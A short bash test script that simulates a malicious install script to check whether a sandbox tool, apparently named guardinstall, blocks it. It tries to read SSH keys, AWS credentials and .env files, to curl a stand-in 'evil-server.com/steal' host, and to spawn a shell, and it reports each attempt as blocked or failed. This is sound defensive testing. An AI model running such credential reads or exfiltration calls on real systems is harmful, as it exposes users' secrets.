#!/bin/bash
# Test malicious script - simulates what guardinstall should block

echo "=== Malicious Script Simulation ==="

# 1. Try to read sensitive files
echo "[TEST] Attempting to read ~/.ssh/id_rsa..."
cat ~/.ssh/id_rsa 2>/dev/null && echo "FAIL: Could read SSH key!" || echo "BLOCKED: SSH key not accessible"

echo "[TEST] Attempting to read ~/.aws/credentials..."
cat ~/.aws/credentials 2>/dev/null && echo "FAIL: Could read AWS creds!" || echo "BLOCKED: AWS creds not accessible"

echo "[TEST] Attempting to read .env..."
cat .env 2>/dev/null && echo "FAIL: Could read .env!" || echo "BLOCKED: .env not accessible"

# 2. Try network exfiltration
echo "[TEST] Attempting curl to external server..."
curl -s http://evil-server.com/steal 2>/dev/null && echo "FAIL: Network not blocked!" || echo "BLOCKED: Network access prevented"

# 3. Try to spawn shell
echo "[TEST] Attempting to spawn bash..."
bash -c "echo Shell spawned!" 2>/dev/null && echo "FAIL: Shell spawned!" || echo "BLOCKED: Shell not accessible"

echo ""
echo "If you see 'BLOCKED' above, guardinstall is working!"
echo "If you see 'FAIL', the sandbox failed to block the action."
